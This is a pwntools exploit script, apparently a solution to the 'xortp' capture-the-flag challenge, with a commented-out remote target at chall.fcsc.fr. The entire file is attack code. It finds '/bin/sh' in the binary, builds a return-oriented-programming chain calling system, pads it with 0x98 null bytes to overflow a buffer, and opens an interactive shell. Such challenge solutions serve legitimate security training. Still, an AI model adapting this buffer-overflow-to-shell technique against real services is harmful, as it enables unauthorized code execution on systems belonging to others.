from pwn import *

PATH = "./src/xortp"
REMOTE = "chall.fcsc.fr"
PORT = 2105

context.binary = elf = ELF(PATH)
context.log_level = "debug"

rop = ROP(elf)
cmd = next(elf.search(b'/bin/sh'))
ret_gadget = rop.find_gadget(['ret'])[0]

print("Address of '/bin/sh' : ", hex(cmd))

rop.raw(ret_gadget)
rop.call("system", [cmd])

payload = b"\x00" * (0x98) + rop.chain()

r = process("./src/xortp")
# r = remote(REMOTE, PORT)

r.sendlineafter(b"encrypt?\n", payload)
r.interactive()